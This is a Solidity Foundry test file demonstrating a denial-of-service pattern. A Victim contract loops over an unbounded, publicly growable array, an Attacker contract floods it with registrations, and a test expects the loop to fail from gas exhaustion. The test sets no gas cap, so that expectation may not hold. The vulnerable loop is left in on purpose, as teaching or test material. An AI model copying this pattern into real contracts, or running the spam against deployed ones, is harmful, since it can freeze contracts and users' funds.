// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @title Victim contract vulnerable to DoS by gas exhaustion
contract Victim {
    address[] public users;
    uint public sum;

    /// Anyone can register
    function register() public {
        users.push(msg.sender);
    }

    /// A function that loops over all users
    function processAll() external {
        // vulnerable: linear loop over unbounded array
        for (uint256 i = 0; i < users.length; i++) {
            // simulate some work
            sum += i;
        }
    }

    function getUserCount() public view returns (uint256) {
        return users.length;
    }
}

/// @title Attacker spams registrations
contract Attacker {
    Victim public victim;

    constructor(address _victim) {
        victim = Victim(_victim);
    }

    /// Spam register with many bogus users
    function attack(uint256 count) public {
        for (uint256 i = 0; i < count; i++) {
            victim.register();
        }
    }
}

/// @title Test for DoS via gas limit
contract DoSArrayTest is Test {
    Victim victim;
    Attacker attacker;
    address normalUser = address(0xBEEF);

    function setUp() public {
        victim = new Victim();
        attacker = new Attacker(address(victim));
    }

    function testDoSAttack() public {
        // Normal user registers fine
        vm.prank(normalUser);
        victim.register();
        assertEq(victim.getUserCount(), 1, "One user registered");

        // Attacker spams with many bogus entries
        attacker.attack(45720);
        emit log_named_uint("User count after attack", victim.getUserCount());

        // Now, if victim tries to process all users, tx will run out of gas
        vm.expectRevert(); // simulating gas exhaustion
        victim.processAll();
    }
}
